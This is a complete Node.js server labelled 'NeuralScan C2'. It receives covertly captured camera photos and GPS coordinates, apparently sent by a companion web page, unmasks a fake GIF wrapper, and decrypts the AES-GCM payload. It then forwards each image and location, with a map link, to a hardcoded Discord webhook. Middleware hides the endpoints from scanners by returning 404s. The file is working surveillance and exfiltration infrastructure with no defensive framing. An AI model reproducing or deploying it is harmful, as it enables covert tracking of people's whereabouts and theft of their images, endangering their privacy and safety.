const express = require('express');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const app = express();

const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = https://discord.com/api/webhooks/1474615026307563611/_JroK-CofeHzoY-UZaGnzFbtjA9HEUiMFuYSNs0dkRy52CIUFeUa2xF-mNDykTM0aDiL;
const SECRET_PASSPHRASE = "neural-link-omega-99"; 
const STEALTH_TOKEN = "delta-v-882-alpha";
const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";

// Increase limit to handle high-res biometric uploads
app.use(express.json({ limit: '50mb' }));

/** * EVASION MIDDLEWARE
 * Scanners (Shodan, Censys, Blue Team bots) will get a 404.
 * Only the specific NeuralScan client with the secret header gets through.
 */
app.use((req, res, next) => {
    if (req.path === '/save-photo' || req.path === '/heartbeat') {
        const token = req.header('X-Neural-Token');
        if (token !== STEALTH_TOKEN) {
            return res.status(404).send('Not Found'); // Stealth 404
        }
    }
    next();
});

/**
 * AUTHENTICATED DECRYPTION
 * Unmasks the fake GIF and decrypts the AES-256-GCM package.
 */
function decryptPackage(maskedData) {
    try {
        // 1. Strip the fake 1x1 GIF header and decode Base64
        const jsonString = Buffer.from(maskedData.replace(GIF_MASK, ""), 'base64').toString();
        const { iv, content } = JSON.parse(jsonString);
        
        // 2. Derive the 256-bit key (matches frontend PBKDF2)
        const salt = Buffer.from("neural-static-salt");
        const key = crypto.pbkdf2Sync(SECRET_PASSPHRASE, salt, 100000, 32, 'sha256');

        // 3. Prepare buffers (GCM tag is the last 16 bytes)
        const ivBuffer = Buffer.from(iv, 'base64');
        const encryptedBuffer = Buffer.from(content, 'base64');
        const tag = encryptedBuffer.slice(encryptedBuffer.length - 16);
        const ciphertext = encryptedBuffer.slice(0, encryptedBuffer.length - 16);

        // 4. Decrypt and verify integrity
        const decipher = crypto.createDecipheriv('aes-256-gcm', key, ivBuffer);
        decipher.setAuthTag(tag);

        let decrypted = decipher.update(ciphertext, 'binary', 'utf8');
        decrypted += decipher.final('utf8');

        return JSON.parse(decrypted);
    } catch (err) {
        console.error("[-] Decryption failed: Potential tampering or key mismatch.");
        return null;
    }
}

// PERSISTENCE HEARTBEAT
app.head('/heartbeat', (req, res) => res.sendStatus(200));

// MAIN EXFILTRATION ROUTE
app.post('/save-photo', async (req, res) => {
    const intel = decryptPackage(req.body.data);
    
    if (!intel) return res.status(404).send();

    console.log(`[+] Captured Intel: Target @ ${intel.metadata.location.lat}, ${intel.metadata.location.lon}`);

    if (DISCORD_WEBHOOK) {
        try {
            const base64Image = intel.image.split(',')[1];
            const buffer = Buffer.from(base64Image, 'base64');
            const form = new FormData();
            
            form.append('file', buffer, { filename: 'intel_capture.jpg' });
            
            const embed = {
                title: "🛰️ NEURALSCAN: PERSISTENT INTEL",
                color: 0x6366f1,
                timestamp: intel.metadata.ts,
                fields: [
                    { name: "📍 Coordinates", value: `\`${intel.metadata.location.lat}, ${intel.metadata.location.lon}\``, inline: true },
                    { name: "🔗 Tunnel", value: "AES-256-GCM / Masked", inline: true },
                    { name: "🗺️ Maps", value: `[View Location](https://www.google.com/maps?q=${intel.metadata.location.lat},${intel.metadata.location.lon})` }
                ],
                image: { url: "attachment://intel_capture.jpg" },
                footer: { text: "NeuralScan C2 v4.0 | Persistence Active" }
            };

            form.append('payload_json', JSON.stringify({ embeds: [embed] }));

            await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
        } catch (err) {
            console.error("[-] Discord relay failed.");
        }
    }

    res.sendStatus(200);
});

// Serve the persistent frontend
app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));

// Fallback: 404 everything else to stay hidden
app.use((req, res) => res.status(404).send('Not Found'));

app.listen(PORT, () => {
    console.log(`\n🚀 NEURALSCAN C2 ACTIVE`);
    console.log(`📡 Persistence Port: ${PORT}`);
    console.log(`🛡️  Evasion Mode: ENABLED\n`);
});
